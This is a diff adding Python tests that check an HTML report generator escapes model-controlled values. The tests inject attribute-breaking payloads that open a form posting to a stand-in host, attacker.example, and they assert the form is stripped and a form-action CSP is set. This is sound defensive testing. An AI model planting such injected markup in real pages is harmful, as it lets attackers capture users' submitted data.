@@ -1054,3 +1054,34 @@ def test_rubric_expand_requires_recurrence_across_sessions():
     several = _cluster(session_count=3, cost=10.0, invocation_count=40)
     rec, _ = _apply_verdict_rubric("EXPAND", several, cost_opts, {"nature": "repeatable"})
     assert rec == "EXPAND"
+
+
+# ---------------------------------------------------------------------------
+# Reporters: model-controlled values never reach markup unescaped
+# ---------------------------------------------------------------------------
+
+_FORM = 'x"><form action="https://attacker.example/c"><input name="q" value="'
+
+
+def test_html_report_allowlists_class_attributes(tmp_path):
+    out = tmp_path / "r.html"
+    a = _assessment(recommendation='REFINE"><form action="https://attacker.example/r">')
+    a["nature"] = _FORM
+    a["cost_optimizations"]["prompt_caching"] = {"status": _FORM, "detail": "d"}
+    generate_html_report([a], str(out))
+    html = out.read_text()
+    assert "<form" not in html
+    assert 'class="nature-badge experimental"' in html
+    assert "form-action 'none'" in html
+
+    generate_html_report([_assessment(recommendation="NOT_ASSESSED")], str(out))
+    assert '<span class="severity-badge not_assessed">NOT ASSESSED</span>' in out.read_text()
+
+
+def test_reporters_survive_non_string_nature(tmp_path):
+    for nature in (None, ["repeatable"], 3):
+        a = _assessment()
+        a["nature"] = nature
+        generate_html_report([a], str(tmp_path / "r.html"))
+        generate_report([a], str(tmp_path / "r.md"))
+        assert "Experimental" in (tmp_path / "r.md").read_text()
